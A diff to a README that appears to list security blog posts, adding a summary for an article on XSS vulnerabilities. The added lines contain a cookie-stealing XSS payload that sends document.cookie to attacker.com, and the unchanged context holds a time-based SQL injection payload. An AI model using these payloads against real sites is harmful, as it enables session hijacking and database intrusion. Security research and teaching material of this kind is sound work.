@@ -24,9 +24,13 @@ This repository serves as a collection of insightful and informative blog posts 
 
   ``+(select*from(select(sleep(20)))a)+`` 
 
-- Hidden Dangers of XSS Vulnerabilities — Real Case
+- **[Hidden Dangers of XSS Vulnerabilities — Real Case](https://medium.com/meetcyber/hidden-dangers-of-xss-vulnerabilities-real-case-22177daa6fc8)**
 
-  https://medium.com/meetcyber/hidden-dangers-of-xss-vulnerabilities-real-case-22177daa6fc8
+  With this XSS payload, you can change the location in a reflected XSS vulnerability and redirect the page.
+
+  Another favorite of mine is a payload that allows you to steal cookies:
+
+  ``<script>new Image().src="https://attacker.com/cookie.php?cookie="+document.cookie</script>``
 
 - Humorous XSS Vulnerabilities in a Movie Website
 
